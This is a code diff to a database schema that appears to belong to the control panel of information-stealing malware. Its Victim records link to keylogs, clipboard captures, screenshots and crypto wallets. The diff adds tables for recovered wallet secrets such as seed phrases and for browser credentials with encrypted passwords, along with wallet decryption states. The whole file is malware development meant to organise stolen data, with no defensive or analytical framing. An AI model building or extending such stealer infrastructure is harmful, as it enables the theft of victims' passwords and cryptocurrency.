@@ -53,8 +53,10 @@ enum WalletState {
   found
   decrypted
   locked
+  no_vault
   unsupported
   corrupt
+  failed
 }
 
 enum BuildStatus {
@@ -179,6 +181,7 @@ model Victim {
   artifacts       Artifact[]
   uploads         Upload[]
   wallets         Wallet[]
+  credentials     Credential[]
   clipboard       ClipboardEntry[]
   keylogs         Keylog[]
   screenshots     Screenshot[]
@@ -287,7 +290,9 @@ model Artifact {
   task          Task?          @relation(fields: [taskId], references: [id], onDelete: SetNull)
   upload        Upload?        @relation(fields: [uploadId], references: [id], onDelete: Cascade)
   wallets       Wallet[]
+  secrets       WalletSecret[]
   screenshots   Screenshot[]
+  credentials   Credential[]
 
   @@index([victimId, module, createdAt])
   @@index([status])
@@ -299,19 +304,69 @@ model Wallet {
   artifactId   String?     @db.Uuid
   kind         String
   targetId     String
+  label        String?
+  source       String?
   path         String
   state        WalletState @default(found)
   decryptState String      @default("none")
+  decryptError String?
   reason       String?
   address      String?
   balance      String?
   createdAt    DateTime    @default(now())
+  lastSeenAt   DateTime    @default(now())
+  updatedAt    DateTime    @default(now()) @updatedAt
   victim       Victim      @relation(fields: [victimId], references: [id], onDelete: Cascade)
   artifact     Artifact?   @relation(fields: [artifactId], references: [id], onDelete: SetNull)
+  secrets      WalletSecret[]
 
   @@unique([victimId, path])
   @@index([victimId, state])
+  @@index([victimId, targetId])
   @@index([state, address])
+  @@index([lastSeenAt])
+}
+
+model WalletSecret {
+  id           String    @id @default(uuid()) @db.Uuid
+  walletId     String    @db.Uuid
+  kind         String
+  valueEnc     String
+  valueHash    String
+  words        Int?
+  confidence   Float?
+  source       String?
+  artifactId   String?   @db.Uuid
+  firstSeenAt  DateTime  @default(now())
+  updatedAt    DateTime  @default(now()) @updatedAt
+  wallet       Wallet    @relation(fields: [walletId], references: [id], onDelete: Cascade)
+  artifact     Artifact? @relation(fields: [artifactId], references: [id], onDelete: SetNull)
+
+  @@unique([walletId, kind, valueHash])
+  @@index([walletId, kind])
+  @@index([valueHash])
+}
+
+model Credential {
+  id          String    @id @default(uuid()) @db.Uuid
+  victimId    String    @db.Uuid
+  targetId    String
+  kind        String    @default("browser")
+  path        String
+  url         String?
+  username    String    @default("")
+  passwordEnc String?
+  state       String    @default("found")
+  reason      String?
+  artifactId  String?   @db.Uuid
+  firstSeenAt DateTime  @default(now())
+  updatedAt   DateTime  @default(now()) @updatedAt
+  victim      Victim    @relation(fields: [victimId], references: [id], onDelete: Cascade)
+  artifact    Artifact? @relation(fields: [artifactId], references: [id], onDelete: SetNull)
+
+  @@unique([victimId, targetId, path, username])
+  @@index([victimId, updatedAt])
+  @@index([targetId])
 }
 
 model ClipboardEntry {
